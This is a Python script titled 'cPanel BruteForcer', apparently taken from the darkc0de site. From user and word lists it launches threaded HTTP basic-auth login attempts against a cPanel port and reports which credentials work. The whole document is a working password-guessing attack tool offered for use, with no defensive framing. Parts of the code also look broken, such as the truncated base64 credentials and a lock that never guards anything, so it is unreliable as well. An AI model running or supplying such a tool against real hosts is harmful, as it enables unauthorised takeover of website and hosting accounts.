#!usr/bin/python
#cPanel BruteForcer
#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import threading, time, random, sys, urllib.request, http.client, base64
from copy import copy
	
def timer():
	now = time.localtime(time.time())
	return time.asctime(now)
	
if len(sys.argv) !=4:
	print ("\nUsage: ./cPanelbrute.py <address> <userlist> <wordlist>\n")
	print ("ex: python cPanelbrute.py example.com:2082 users.txt wordlist.txt\n")
	sys.exit(1)

try:
  	users = open(sys.argv[2], "r").readlines()
except(IOError): 
  	print ("Error: Check your userlist path\n")
  	sys.exit(1)
  
try:
  	words = open(sys.argv[3], "r").readlines()
except(IOError): 
  	print ("Error: Check your wordlist path\n")
  	sys.exit(1)

wordlist = copy(words)

def reloader():
	for word in wordlist:
		words.append(word)

def getword():
	lock = threading.Lock()
	lock.acquire()
	if len(words) != 0:
		value = random.sample(words,  1)
		words.remove(value[0])		
	else:
		print ("\nReloading Wordlist - Changing User\n")
		reloader()
		value = random.sample(words,  1)
		users.remove(users[0])
		
	lock.release()
	if len(users) ==1:
		return users[0], value[0][:-1]
	else:
		return users[0][:-1], value[0][:-1] 

def getauth(url):
	
	req = urllib.request.Request(url)
	try:
    		handle = urllib.request.urlopen(req)
	except IOError as e:               
		if not hasattr(e, 'code') or e.code != 401:   
				print (e)
				sys.exit(1)

		authline = e.headers.get('www-authenticate', '')    
			
		if not authline:
				print ('\nA 401 error without a basic authentication response header - very weird.\n')
				sys.exit(1)
		else:
			return authline
	else:                               
		print ("This page isn't protected by basic authentication.\n")
		sys.exit(1)
   
	
			
class Worker(threading.Thread):
	
	def run(self):
		username, password = getword()
		try:
			print ("-"*12)
			print ("User:",username,"Password:",password)
			auth_handler = urllib.request.HTTPBasicAuthHandler()
			auth_handler.add_password("cPanel", server, base64.b64encode(bytes(username, 'utf-8'))[:-1], base64.b64encode(bytes(password,'utf-8'))[:-1])
			opener = urllib.request.build_opener(auth_handler)
			urllib.request.install_opener(opener)
			urllib.request.urlopen(server)
			print ("\t\n\nUsername:",username,"Password:",password,"----- Login successful!!!\n\n")		
		except (urllib.request.HTTPError, http.client.BadStatusLine) as msg: 
			#print "An error occurred:", msg
			pass
		
if sys.argv[1][-1] == "/":
	sys.argv[1] = sys.argv[1][:-1] 
server = sys.argv[1]


print ("[+] Server:",server)
print ("[+] Users Loaded:",len(users))
print ("[+] Words Loaded:",len(words))
print ("[+]",getauth(server))
print ("[+] Started",timer(),"\n")

for i in range(len(words)*len(users)):
	work = Worker()
	work.setDaemon(1)
	work.start()
	time.sleep(1)
print ("\n[-] Done -",timer(),"\n")
